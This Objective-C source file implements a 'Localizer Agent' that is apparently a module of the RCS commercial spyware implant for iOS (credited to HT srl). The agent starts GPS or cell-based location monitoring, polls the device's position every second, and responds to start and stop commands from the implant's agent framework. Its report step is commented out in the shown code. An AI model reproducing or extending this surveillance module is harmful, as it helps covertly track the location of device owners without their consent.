/*
 * RCSIAgentLocalizer.h
 *  Localizer Agent - through GPS or GSM cell
 *
 *
 * Created by Alfredo 'revenge' Pesoli on 07/10/2009
 * Copyright (C) HT srl 2009. All rights reserved
 *
 */

#import "RCSIAgentPosition.h"
//#define DEBUG

static RCSIAgentPosition *sharedAgentPosition = nil;

typedef struct _position {
  u_int refreshInterval;
  u_int mode;             // 1 GPS - 2 GSM cell - 3 Both
} positionAgentStruct;


@implementation RCSIAgentPosition

@synthesize mCurrentLatitude;
@synthesize mCurrentLongitude;
@synthesize mLocationManager;
@synthesize mCurrentLocation;
@synthesize mAgentConfiguration;
@synthesize mIsRunning;

#pragma mark Cleanup

- (void)dealloc
{
  [super dealloc];
}

- (void)locationManager: (CLLocationManager *)manager
    didUpdateToLocation: (CLLocation *)newLocation
           fromLocation: (CLLocation *)oldLocation
{
#ifdef DEBUG
  NSLog(@"locationManager callback called");
#endif
  
  NSDate *newLocationDate = newLocation.timestamp;
	NSTimeInterval howRecentNewLocation = [newLocationDate timeIntervalSinceNow];
	
	// Filter cached and old locations
	if ((!mCurrentLocation || mCurrentLocation.horizontalAccuracy > newLocation.horizontalAccuracy)
      && (howRecentNewLocation < -0.0 && howRecentNewLocation > -10.0))
    {
      if (mCurrentLocation)
        [mCurrentLocation release];
      
      mCurrentLocation = [newLocation retain];
      
#ifdef DEBUG
      NSLog(@"new location: %@", mCurrentLocation);
#endif
    }
  else
    {
#ifdef DEBUG
      NSLog(@"Failed to pass checks on location manager update");
      NSLog(@"Current location: %@", mCurrentLocation);
#endif
    }
}

- (void)locationManager: (CLLocationManager *)manager
       didFailWithError: (NSError *)error
{
  // The location "unknown" error simply means the manager is currently unable to get the location.
  // We can ignore this error for the scenario of getting a single location fix, because we already have a 
  // timeout that will stop the location manager to save power.
  if ([error code] != kCLErrorLocationUnknown)
    {
#ifdef DEBUG
      NSLog(@"Error on location update: (%@)", [error description]);
#endif
    }
}

- (void)start
{
  NSAutoreleasePool *outerPool = [[NSAutoreleasePool alloc] init];
#ifdef DEBUG
  NSLog(@"Agent Position started");
#endif
  [mAgentConfiguration setObject: AGENT_RUNNING forKey: @"status"];

#ifdef DEBUG
  NSLog(@"AgentConf: %@", mAgentConfiguration);
#endif

  NSDate *gpsStartedDate  = [NSDate date];
  NSTimeInterval interval = 0;

  while ([mAgentConfiguration objectForKey: @"status"] != AGENT_STOP &&
         [mAgentConfiguration objectForKey: @"status"] != AGENT_STOPPED)
    {
      NSAutoreleasePool *innerPool = [[NSAutoreleasePool alloc] init];
      
      positionAgentStruct *positionRawData;
      positionRawData = (positionAgentStruct *)[[mAgentConfiguration objectForKey: @"data"] bytes];
      
      if (mIsRunning == FALSE)
        {
          mIsRunning = TRUE;
        
          if (gOSMajor == 3)
            {
              if (mLocationManager.locationServicesEnabled)
                {
#ifdef DEBUG
                  NSLog(@"Starting location for 3.x");
#endif
                  [mLocationManager startUpdatingLocation];
                }
              else
                {
#ifdef DEBUG
                  NSLog(@"Location service unavailable 3.x");
#endif
                }
            }
          else if (gOSMajor == 4)
            {
              if ([mLocationManager locationServicesEnabled])
                {
#ifdef DEBUG
                  NSLog(@"Starting location for 4.x");
#endif
                  //
                  // we can use the significant-change location service
                  // - significant power savings
                  //
                  [mLocationManager
                    performSelector: @selector(startMonitoringSignificantLocationChanges)];
                  //[mLocationManager startUpdatingLocation];
                }
              else
                {
#ifdef DEBUG
                  NSLog(@"Location service unavailable 4.x");
#endif
                }
            }
        }
      
      interval = [[NSDate date] timeIntervalSinceDate: gpsStartedDate];
      /*
      if (fabs(interval) >= 30)
        {
          //[self generateLog];
          
          mIsRunning = FALSE;
          gpsStartedDate = [[NSDate date] retain];
        }
      */
      [innerPool release];
      CLLocation *location = mLocationManager.location;

#ifdef DEBUG
      NSLog(@"location: %@", location);
#endif
      
      usleep(1000000);
    }
  
  if ([mAgentConfiguration objectForKey: @"status"] == AGENT_STOP)
    {
      [mAgentConfiguration setObject: AGENT_STOPPED forKey: @"status"];
      [mLocationManager stopUpdatingLocation];
      mLocationManager.delegate = nil;
    }
  
  [outerPool release];
}

- (BOOL)stop
{
  int internalCounter = 0;
  
  [mAgentConfiguration setObject: AGENT_STOP forKey: @"status"];
  
  while ([mAgentConfiguration objectForKey: @"status"] != AGENT_STOPPED &&
         internalCounter <= MAX_WAIT_TIME)
    {
      internalCounter++;
      sleep(1);
    }
#ifdef DEBUG
  NSLog(@"Agent Position stopped");
#endif
  
  return YES;
}

- (BOOL)resume
{
  return TRUE;
}

#pragma mark -
#pragma mark Class and init methods
#pragma mark -

+ (RCSIAgentPosition *)sharedInstance
{
  @synchronized(self)
  {
    if (sharedAgentPosition == nil)
      {
        //
        // Assignment is not done here
        //
        [[self alloc] init];
      }
  }
  
  return sharedAgentPosition;
}

+ (id)allocWithZone: (NSZone *)aZone
{
  @synchronized(self)
  {
    if (sharedAgentPosition== nil)
      {
        sharedAgentPosition = [super allocWithZone: aZone];
        
        //
        // Assignment and return on first allocation
        //
        return sharedAgentPosition;
      }
  }
  
  // On subsequent allocation attemps return nil
  return nil;
}

- (id)copyWithZone: (NSZone *)aZone
{
  return self;
}

- (id)retain
{
  return self;
}

- (unsigned)retainCount
{
  // Denotes an object that cannot be released
  return UINT_MAX;
}

- (void)release
{
  // Do nothing
}

- (id)autorelease
{
  return self;
}

- (id)init
{
  Class myClass = [self class];
  
  @synchronized(myClass)
  {
    if (sharedAgentPosition != nil)
      {
        self = [super init];
        
        if (self != nil)
          {
            sharedAgentPosition = self;
            mLocationManager = [[CLLocationManager alloc] init];
            mLocationManager.delegate         = self;
            //mLocationManager.desiredAccuracy  = kCLLocationAccuracyBest;
            //mLocationManager.distanceFilter   = 1;
          }
        
      }
  }
  
  return sharedAgentPosition;
}

@end
